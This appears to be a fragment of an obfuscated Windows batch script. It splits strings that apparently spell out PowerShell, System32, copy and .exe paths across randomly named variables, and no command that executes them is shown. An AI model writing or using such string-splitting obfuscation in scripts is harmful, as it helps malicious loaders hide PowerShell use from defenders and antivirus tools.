@echo off
set "XeMzmeMoEA=1."
set "qhFhETJwEK=nd"
set "DytwADfYXn=in"
set "lTUFfXslUh=co"
set "ssTVHUBvDu=he"
set "cPJDATkMfc=ws"
set "MEijHuVqUv=ll"
set "wFjlvZHMMu=we"
set "mtixwOPPWG=rS"
set "irHvuTrigu=po"
set "CMvRcnRYeu=Sy"
set "GjUByNUIfE=Po"
set "JJCCtHAIeN=py"
set "eZOWtajzOL=y "
set "BCYjgBHvrY=s\"
set "EJQGSNvlqQ=xe"
set "TeqSxXjjaE=we"
